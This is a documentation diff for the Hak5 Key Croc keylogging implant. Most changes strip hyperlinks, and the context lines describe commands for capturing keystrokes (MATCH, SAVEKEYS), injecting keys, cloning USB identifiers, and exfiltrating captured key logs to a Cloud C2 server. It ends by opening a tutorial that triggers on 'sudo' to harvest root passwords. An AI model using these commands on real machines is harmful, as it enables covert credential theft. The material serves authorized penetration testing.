@@ -235,7 +235,7 @@ In the extreme case that the Key Croc has become permanently inaccessible or ino
 Hold the arming mode button with a paperclip, SIM card tool or similar instrument.
 
 1. While holding the arming mode button, plug the Key Croc into a USB port and unplug it immediately after the green LED turns white.
-2. Repeat step #2 three times while holding the arming mode button.
+2. Repeat step 1 three times while holding the arming mode button.
 3. Finally, plug the Key Croc into a USB port a 4th time when when the green LED turns to an alternating red/blue pattern, release the arming mode button.
 4. This process will take 5-10 minutes. When the firmware recovery has completed, the Key Croc will reboot, indicated by the green LED.
 
@@ -524,7 +524,7 @@ The Key Croc can be configured to connect to a Cloud C2 instance for remote keys
 
 For additional help on using Cloud C2 server, see the Cloud C2 documentation at [https://docs.hak5.org](https://docs.hak5.org/hc/en-us/categories/360001177114-Cloud-C2)
 
-Information on using Cloud C2 functions in your payloads can be found in the [Payload Development ](/key-croc/writing-payloads/key-croc-payload-development.md)section of this documentation.
+Information on using Cloud C2 functions in your payloads can be found in the Payload Development section of this documentation.
 
 ---
 
@@ -641,7 +641,7 @@ MATCH hello
 
 Will trigger payload execution when specified pattern is typed.
 
-See the [MATCH article](https://docs.hak5.org/hc/en-us/articles/360048015513) for full usage.
+See the MATCH article for full usage.
 
 #### SAVEKEYS
 
@@ -658,7 +658,7 @@ SAVEKEYS /root/loot/test.log NEXT 6
 
 Will save the specified number of keys to a file – either before (LAST) or after (NEXT) the payload MATCH.
 
-See the [SAVEKEYS article](https://docs.hak5.org/hc/en-us/articles/360048015513) for full usage.
+See the SAVEKEYS article for full usage.
 
 #### QUACK
 
@@ -672,7 +672,7 @@ QUACK <keystrokes to inject>
 QUACK STRING hello world
 ```
 
-Will inject keystrokes specified. See the [QUACK article](https://docs.hak5.org/hc/en-us/articles/360047381354) for full usage.&#x20;
+Will inject keystrokes specified. See the QUACK article for full usage.&#x20;
 
 #### QUACKFILE
 
@@ -700,7 +700,7 @@ ATTACKMODE <modes> <options>
 ATTACKMODE HID ECM_ETHERNET VID_0X05AC PID_0X021E MAN_Hak5 SN_1337
 ```
 
-Will emulate a USB device from the specified modes and options. See the [ATTACKMODE article](https://docs.hak5.org/hc/en-us/articles/360048016053) for full usage.
+Will emulate a USB device from the specified modes and options. See the ATTACKMODE article for full usage.
 
 #### LED
 
@@ -714,7 +714,7 @@ LED <status>
 LED SETUP
 ```
 
-Will control the multi-color LED. See the [LED article](https://docs.hak5.org/hc/en-us/articles/360047383854) for full usage.
+Will control the multi-color LED. See the LED article for full usage.
 
 #### GET\_VARS
 
@@ -734,7 +734,7 @@ Will return a set of useful variables which may be referenced in the payload
 * `$TARGET_HOSTNAME` – Host name of the target after executing an Ethernet `ATTACKMODE`
 
 > [!NOTE]
-> The `$LOOT` variable is always available after `MATCH` triggers the payload. See the [MATCH article](/key-croc/writing-payloads/the-match-command.md) for `$LOOT` details.
+> The `$LOOT` variable is always available after `MATCH` triggers the payload. See the MATCH article for `$LOOT` details.
 
 #### RELOAD\_PAYLOADS
 
@@ -864,7 +864,7 @@ C2NOTIFY <INFO|WARN|ERROR> <MESSAGE>
 C2NOTIFY INFO 'The cake is a lie'
 ```
 
-Will send a notification to the configured Cloud C2 server. See the [Configuring Cloud C2 article](https://docs.hak5.org/hc/en-us/articles/360047380674).
+Will send a notification to the configured Cloud C2 server. See the Configuring Cloud C2 article.
 
 #### C2EXFIL
 
@@ -878,7 +878,7 @@ C2EXFIL (optional)STRING (required)<PATH> (optional)<SOURCE>
 C2EXFIL STRING /root/loot/captured_keys.txt My_Payload
 ```
 
-Will exfiltrate the specified file to the configured Cloud C2 server. See the [Configuring Cloud C2 article](/key-croc/configuring-cloud-c.md).
+Will exfiltrate the specified file to the configured Cloud C2 server. See the Configuring Cloud C2 article.
 
 ---
 
@@ -1102,7 +1102,7 @@ HID – Human Interface Device. This is the attack mode which emulates a keyboar
 
 Without this attack mode, the Key Croc will not pass through keyboard input to the target.
 
-The `VID` and `PID` values of the connected keyboard are automatically cloned for this particular attack mode, as described in the section on Hardware ID Cloning. This may be overridden by specifying a VID and PID value in the [config.txt](/key-croc/configuration.md).&#x20;
+The `VID` and `PID` values of the connected keyboard are automatically cloned for this particular attack mode, as described in the section on Hardware ID Cloning. This may be overridden by specifying a VID and PID value in the config.txt.&#x20;
 
 #### STORAGE
 
@@ -1131,7 +1131,7 @@ USB devices identify themselves by combinations of unique identifiers, including
 > [!NOTE]
 > By default the Key Croc will automatically clone the identifiers of the connected keyboard.&#x20;
 
-These identifiers are saved to /tmp/ and may be used in your payloads. This may be overridden by specifying values in the [config.txt](/key-croc/configuration.md).&#x20;
+These identifiers are saved to /tmp/ and may be used in your payloads. This may be overridden by specifying values in the config.txt.&#x20;
 
 `ATTACKMODE` accepts `VID` and `PID` parameters, in addition to `SERIAL` (Serial Number), `MAN` (Manufacturer) and `PROD` (Product)
 
@@ -1185,7 +1185,7 @@ The Key Croc introduces enhancements to the Ducky Script keystroke injection com
 
 The following are the basic "`QUACK`" commands – named in honor of the Rubber Ducky that invented the keystroke injection attack.
 
-In order to use Ducky Script 2.0, or `QUACK`, in a payload the attack mode must contain the `HID` option. This is the default attack mode on boot. See the [ATTACKMODE](/key-croc/writing-payloads/the-attackmode-command.md) section for information on additional attack mode options.
+In order to use Ducky Script 2.0, or `QUACK`, in a payload the attack mode must contain the `HID` option. This is the default attack mode on boot. See the ATTACKMODE section for information on additional attack mode options.
 
 #### DUCKY\_LANG
 
@@ -1444,7 +1444,7 @@ Even in an era with single sign-on and password managers, a recent [usenix study
 
 #### A GREAT PAYLOAD BEGINS WITH A GREAT MATCH
 
-The most powerful [Ducky Script](https://docs.hak5.org/hc/en-us/categories/360004054433-Ducky-Script) command for the Key Croc is `MATCH`. Quite simply, whenever the user types something that matches this parameter, the payload gets triggered. That can be as simple as a string like "password" or as complex as a regular expression to weed out email addresses.
+The most powerful Ducky Script command for the Key Croc is `MATCH`. Quite simply, whenever the user types something that matches this parameter, the payload gets triggered. That can be as simple as a string like "password" or as complex as a regular expression to weed out email addresses.
 
 Let's imagine we want true pentest gold; root passwords. Picture this, an engineers workstation - from devops to QA. Like you, the pentester, from time to time throughout the day - root is required. Whether an apt update or moving certain files, sudo provides a convenient means to temporarily DO something as the Super User. So for our example, let's keep it simple and `MATCH` on the string "`sudo`"
 
